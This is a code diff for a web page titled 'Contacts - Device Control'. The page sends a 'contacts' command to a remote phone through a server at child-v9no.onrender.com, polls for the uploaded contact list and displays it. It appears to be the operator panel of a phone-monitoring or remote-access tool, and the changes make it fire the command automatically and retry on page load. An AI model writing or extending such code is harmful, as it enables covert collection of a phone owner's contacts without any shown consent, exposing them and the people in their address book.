@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contacts - Server Check</title>
+    <title>Contacts - Device Control</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -13,7 +13,6 @@
             --text-main: #ffffff;
             --text-muted: #aaaaaa;
             --accent: #4caf50;
-            --error: #ff4444;
         }
 
         body {
@@ -39,12 +38,11 @@
             border-bottom: 1px solid var(--glass-border);
         }
 
-        /* --- Naya API Status Bar --- */
         #apiStatus {
-            background: rgba(255,255,255,0.05);
-            font-size: 11px; padding: 8px; border-radius: 10px;
-            margin-bottom: 15px; border-left: 3px solid var(--accent);
-            word-break: break-all; color: #00ff00;
+            background: rgba(0, 243, 255, 0.05);
+            font-size: 11px; padding: 10px; border-radius: 12px;
+            margin-bottom: 15px; border-left: 3px solid #00f3ff;
+            color: #00f3ff; font-family: monospace;
         }
 
         .back-btn {
@@ -52,8 +50,6 @@
             text-decoration: none; display: flex; align-items: center; justify-content: center;
             width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
         }
-
-        .page-title { font-size: 1.1rem; font-weight: bold; }
 
         .contact-list {
             display: flex; flex-direction: column; gap: 10px;
@@ -74,14 +70,12 @@
         }
 
         .info { flex: 1; }
-        .name { font-size: 0.95rem; font-weight: 500; }
+        .name { font-size: 0.95rem; font-weight: 500; color: #fff; }
         .number { font-size: 0.8rem; color: var(--text-muted); }
 
-        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; }
-        
         .refresh-btn {
-            background: var(--accent); border: none;
-            color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer; font-weight: bold;
+            background: var(--accent); border: none; color: white;
+            padding: 8px 15px; border-radius: 20px; cursor: pointer; font-weight: bold;
         }
     </style>
 </head>
@@ -90,96 +84,96 @@
     <div class="container">
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <span class="page-title">Device Contacts</span>
-            <button onclick="fetchContacts()" class="refresh-btn" id="refreshBtn">Refresh</button>
+            <span class="page-title">Contacts</span>
+            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn">Refresh</button>
         </div>
 
-        <div id="apiStatus">System Initializing...</div>
+        <div id="apiStatus">Initializing...</div>
 
         <div class="contact-list" id="contactsContainer">
-            <div class="status-msg">Click Refresh to check server...</div>
+            <div style="text-align: center; color: #666; margin-top: 50px;">Waiting for data...</div>
         </div>
     </div>
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com";
         const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id');
+        
+        // ID ko hamesha uppercase rakhein server se match karne ke liye
+        const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
         const storageKey = `contacts_${DEVICE_ID}`;
         const statusEl = document.getElementById("apiStatus");
+        let retryCount = 0;
 
-        function setStatus(msg, color = "#00ff00") {
-            statusEl.style.color = color;
-            statusEl.style.borderLeftColor = color;
-            statusEl.innerHTML = `<strong>📡 Status:</strong> ${msg}`;
+        function setStatus(msg, isError = false) {
+            statusEl.style.color = isError ? "#ff4444" : "#00f3ff";
+            statusEl.innerHTML = `📡 <strong>Status:</strong> ${msg}`;
         }
 
         document.addEventListener("DOMContentLoaded", () => {
             if (!DEVICE_ID) {
-                setStatus("ERROR: Device ID missing in URL!", "#ff4444");
+                setStatus("Error: Device ID missing!", true);
                 return;
             }
+            setStatus(`Device ID: ${DEVICE_ID} detected.`);
             
-            setStatus(`Ready. Device ID: ${DEVICE_ID}`);
+            // 1. Local storage se purana data dikhao
             loadFromStorage();
-            sendCommand();
-            setTimeout(fetchContacts, 3000); 
+            
+            // 2. Automatically phone ko command bhejo aur data fetch karo
+            handleRefresh();
         });
 
         function loadFromStorage() {
-            const savedData = localStorage.getItem(storageKey);
-            if (savedData) {
-                setStatus("Showing data from LocalStorage. Fetching updates...");
-                renderContacts(JSON.parse(savedData));
+            const saved = localStorage.getItem(storageKey);
+            if (saved) {
+                renderContacts(JSON.parse(saved));
             }
         }
 
+        function handleRefresh() {
+            retryCount = 0;
+            sendCommand();
+            // 5 second baad pehla check karein (Phone ko upload karne ka time dein)
+            setTimeout(fetchData, 5000);
+        }
+
         function sendCommand() {
+            setStatus("Sending 'contacts' command to phone...");
             fetch(`${SERVER_URL}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
-            }).then(() => logAppend("Command sent to phone."));
+            }).then(res => res.json())
+              .then(data => console.log("Command queued:", data));
         }
 
-        function fetchContacts() {
+        function fetchData() {
             const btn = document.getElementById("refreshBtn");
-            const container = document.getElementById("contactsContainer");
             btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
             
             const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`;
-            setStatus(`Fetching: ${apiURL}`);
 
             fetch(apiURL)
-                .then(res => {
-                    if (!res.ok) throw new Error(`HTTP Error ${res.status}`);
-                    return res.text(); // Pehle text lete hain taaki [] check kar sakein
-                })
-                .then(rawText => {
-                    console.log("Raw Server Data:", rawText);
-                    
-                    if (rawText.trim() === "[]" || rawText.trim() === "") {
-                        setStatus("SERVER RESPONSE: [] (Data khali hai, phone ne abhi bheja nahi)", "#ff9800");
-                        if(!localStorage.getItem(storageKey)) {
-                           container.innerHTML = `<div class="status-msg">Server replied with [ ].<br>Phone has not uploaded contacts yet.</div>`;
+                .then(res => res.json())
+                .then(data => {
+                    if (!data || data.length === 0) {
+                        if (retryCount < 5) {
+                            retryCount++;
+                            setStatus(`Waiting for phone upload (Attempt ${retryCount}/5)...`);
+                            setTimeout(fetchData, 5000); // Har 5 sec mein check karo
+                        } else {
+                            setStatus("Phone offline ya permission nahi hai.", true);
                         }
                         return;
                     }
 
-                    try {
-                        const data = JSON.parse(rawText);
-                        if (data && data.length > 0) {
-                            localStorage.setItem(storageKey, JSON.stringify(data));
-                            setStatus(`SUCCESS: Received ${data.length} contacts.`);
-                            renderContacts(data);
-                        }
-                    } catch (e) {
-                        setStatus("JSON ERROR: Server sent invalid format", "#ff4444");
-                    }
+                    // Data mil gaya
+                    localStorage.setItem(storageKey, JSON.stringify(data));
+                    setStatus(`Successfully received ${data.length} contacts.`);
+                    renderContacts(data);
                 })
-                .catch(err => {
-                    setStatus(`CONNECTION ERROR: ${err.message}`, "#ff4444");
-                })
+                .catch(err => setStatus("Connection failed: " + err.message, true))
                 .finally(() => {
                     btn.innerHTML = 'Refresh';
                 });
@@ -188,7 +182,10 @@
         function renderContacts(data) {
             const container = document.getElementById("contactsContainer");
             container.innerHTML = "";
+            
+            // Sort Alphabetically
             data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
+
             data.forEach(contact => {
                 const name = contact.name || "Unknown";
                 const num = contact.number || contact.phone || "No Number";
@@ -201,10 +198,6 @@
                         </div>
                     </div>`;
             });
-        }
-
-        function logAppend(msg) {
-            console.log(msg);
         }
     </script>
 </body>
